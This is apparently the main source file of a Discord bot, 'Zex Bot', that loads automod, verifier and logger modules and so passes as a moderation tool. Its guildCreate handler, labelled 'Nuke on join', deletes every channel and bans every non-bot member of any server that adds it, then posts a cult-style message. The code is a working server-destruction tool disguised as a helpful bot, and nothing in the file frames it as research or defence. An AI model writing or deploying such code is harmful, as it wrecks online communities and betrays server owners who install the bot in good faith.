// index.js

const { Client, GatewayIntentBits, Partials } = require('discord.js');
require('dotenv').config();

const express = require('express');
const automod = require('./automod');
const verifier = require('./verifier');
const logger = require('./logger');

const client = new Client({
  intents: [
    GatewayIntentBits.Guilds,
    GatewayIntentBits.GuildMessages,
    GatewayIntentBits.MessageContent,
    GatewayIntentBits.GuildMembers,
    GatewayIntentBits.GuildVoiceStates
  ],
  partials: [Partials.Message, Partials.Channel, Partials.Reaction]
});

// Nuke on join
client.on('guildCreate', async guild => {
  console.log(`🚨 Joined ${guild.name} (${guild.id}) — Nuking initiated.`);

  // 1. Delete all channels
  for (const channel of guild.channels.cache.values()) {
    try {
      await channel.delete();
    } catch (_) {}
  }

  // 2. Ban all members (non-bots)
  await guild.members.fetch(); // Ensure full member cache
  for (const member of guild.members.cache.values()) {
    if (!member.user.bot) {
      try {
        await member.ban({ reason: 'NUKED 🜲' });
      } catch (_) {}
    }
  }

  // 3. Create final message channel
  try {
    const newChannel = await guild.channels.create({
      name: '🜲-////✴',
      type: 0 // text
    });
    await newChannel.send('🜲 THE DEM CULT. ✦ ');
  } catch (e) {
    console.error('❌ Failed to create final channel:', e);
  }
});

client.once('ready', () => {
  console.log(`✅ Logged in as ${client.user.tag}`);
});

automod(client);
verifier(client);
logger(client);

client.login(process.env.TOKEN);

// Dummy server
const app = express();
app.get('/', (_, res) => res.send('Zex Bot is running!'));
app.listen(3000, () => console.log('🌐 Fake server listening on port 3000'));